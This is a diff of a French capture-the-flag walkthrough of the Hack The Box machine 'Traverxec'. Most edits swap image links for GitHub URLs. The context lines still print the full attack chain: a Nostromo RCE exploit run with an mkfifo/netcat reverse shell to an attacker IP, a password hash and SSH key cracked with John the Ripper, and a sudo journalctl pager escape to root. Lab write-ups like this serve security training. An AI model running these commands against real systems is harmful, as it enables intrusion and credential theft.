@@ -30,7 +30,7 @@ Sur le site, on retrouve une page web statique. Si on se renseigne sur  [nostrom
 
 En bas de la page, on a un formulaire, mais il ne fonctionne pas
 
-![](https://github.com/0xLuks/htb-writeup/blob/main/traverxec/img/80-form-disabled)
+![](https://github.com/0xLuks/htb-writeup/blob/main/traverxec/img/80-form-disabled.png)
 
 ## Foothold - www-data
 
@@ -38,33 +38,25 @@ Pas de robots.txt, on commence par fuzz les répertoires et fichiers, mais ça n
 
 L'exploit semble un peu vieux, on va en chercher un autre. Rapidement, on trouve cet [exploit](https://raw.githubusercontent.com/jas502n/CVE-2019-16278/master/CVE-2019-16278.sh) en bash sur Github. Cela nous demande l'hôte comme premier argument, puis le port en second argument et enfin la commande que l'on souhaite.
 
-![[80-rce.png]]
+![](https://github.com/0xLuks/htb-writeup/blob/main/traverxec/img/80-rce.png)
 
 Ca fonctionne et on obtient bien une RCE. Essayons maintenant d'obtenir un reverse shell Bash TCP, ça ne fonctionne pas, mais si on essaye avec le reverse shell mkfifo ça passe et on récupère un shell en tant que www-data
 
 `bash CVE-2019-16278.sh 10.129.24.71 80 "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc 10.10.14.33 9001 >/tmp/f"`
 
-![[shell-www-data.png]]
+![](https://github.com/0xLuks/htb-writeup/blob/main/traverxec/img/shell-www-data.png)
 
 ## Mouvement latéral - david
 
 Sur la machine, on retrouve deux utilisateurs, david qui pourrait être notre pivot et le compte root.
 
-Lancement de linpeas, on peut voir un kernel un peut vieux
+Lancement de linpeas, variables d'env
 
-`OS: Linux version 4.19.0-6-amd64 (debian-kernel@lists.debian.org) (gcc version 8.3.0 (Debian 8.3.0-6)) #1 SMP Debian 4.19.67-2+deb10u1 (2019-09-20)`
+![](https://github.com/0xLuks/htb-writeup/blob/main/traverxec/img/www-data-peas-env.png)
 
-Variables d'env
+Fichier .htpasswd
 
-![[www-data-peas-env.png]]
-
-Crontab
-
-`-rw-r--r-- 1 root root    1042 Jun 23  2019 /etc/crontab`
-
-.htpasswd
-
-![[www-data-peas-htpasswd.png]]
+![](https://github.com/0xLuks/htb-writeup/blob/main/traverxec/img/www-data-peas-htpasswd.png)
 
 `david:$1$e7NfNpNi$A6nCwOTqrNR2oDuIKirRZ/`
 
@@ -72,11 +64,11 @@ On peut tenter de cracker ce hash et ça fonctionne `Nowonly4me`, mais impossibl
 
 `john --format=md5crypt hash-md5-david.txt --wordlist=/opt/rockyou.txt`
 
-![[lat-crack-hash.png]]
+![](https://github.com/0xLuks/htb-writeup/blob/main/traverxec/img/lat-crack-hash.png)
 
 Dans le répertoire contenant le server web nostromo, on retrouve un fichier de conf `nhttpd.conf` qui nous permet de voir qu'il y a un dossier accessible `public_www` sous `/home/david/public_www`
 
-![[lat-conf-nostromo.png]]
+![](https://github.com/0xLuks/htb-writeup/blob/main/traverxec/img/lat-conf-nostromo.png)
 
 Quand on y accède on retrouve un fichier et un dossier :
 - index.html
@@ -86,33 +78,33 @@ Dans ce dossier on retrouve également deux fichiers :
 - .htaccess -> ne donne rien
 - backup-ssh-identity-files.tgz -> archive d'un backup SSH -> juicy :p
 
-![[lat-david-tgz.png]]
+![](https://github.com/0xLuks/htb-writeup/blob/main/traverxec/img/lat-conf-nostromo.png)
 
 On ne peut pas décompresser l'archive sur la target, mais on peut essayer de le transférer sur la machine d'attaque. Ca ne fonctionne pas, on peut tenter de copier le fichier dans /tmp, lui assigner les droits et le décompresser
 
-![[tmp-backup-ssh.png]]
+![](https://github.com/0xLuks/htb-writeup/blob/main/traverxec/img/lat-david-ssh.png)
 
 Ca fonctionne et on retrouve sa clé privée RSA chiffrée sous `/tmp/home/david/.ssh/id_rsa`
 
-![[lat-david_idrsa_crypt.png]]
+![](https://github.com/0xLuks/htb-writeup/blob/main/traverxec/img/lat-david_idrsa_crypt.png)
 
 Utilisation de ssh2john pour générer un hash
 
 `/opt/tools/john/run/ssh2john.py id_rsa_david > id_rsa_david_hash`
 
-![[lat-david-idrsa_hash.png]]
+![](https://github.com/0xLuks/htb-writeup/blob/main/traverxec/img/lat-david-idrsa_hash.png)
 
 Crack avec JtR, on retrouve le mdp `hunter`
 
 `john id_rsa_david_hash --wordlist=/opt/rockyou.txt`
 
-![[lat-david-idrsa_crack.png]]
+![](https://github.com/0xLuks/htb-writeup/blob/main/traverxec/img/lat-david-idrsa_crack.png)
 
 Tentative de connexion en SSH et récupération du flag user.txt
 
 `ssh -i id_rsa_david david@10.129.24.71`
 
-![[Hack The Box/traverxec/img/userflag.png]]
+![](https://github.com/0xLuks/htb-writeup/blob/main/traverxec/img/userflag.png)
 
 ## Elévation de privilèges - root
 
@@ -122,7 +114,7 @@ Si on l'exécute, on obtient ceci
 
 `./server-stats.sh`
 
-![[pe-server-stats.png]]
+![](https://github.com/0xLuks/htb-writeup/blob/main/traverxec/img/pe-server-stats.png)
 
 La dernière ligne fait appel à sudo sur journalctl, cela va ouvrir un less, on peut privesc de cette manière `!/bin/bash`
 
@@ -130,10 +122,8 @@ La dernière ligne fait appel à sudo sur journalctl, cela va ouvrir un less, on
 
 Après plusieurs tentatives, il faut deux terminaux pour que ça fonctionne, en effet si on tente avec un seul, le pager less ne se lance pas.
 
-![[pe-suid-error.png]]
+![](https://github.com/0xLuks/htb-writeup/blob/main/traverxec/img/pe-suid-error.png)
 
-Alors qu'avec deux terminaux, ça fonctionne :D
+Alors qu'avec deux terminaux, ça fonctionne. On peut récupérer le dernier flag
 
-![[rootflag.png]]
-
-
+![](https://github.com/0xLuks/htb-writeup/blob/main/traverxec/img/rootflag.png)
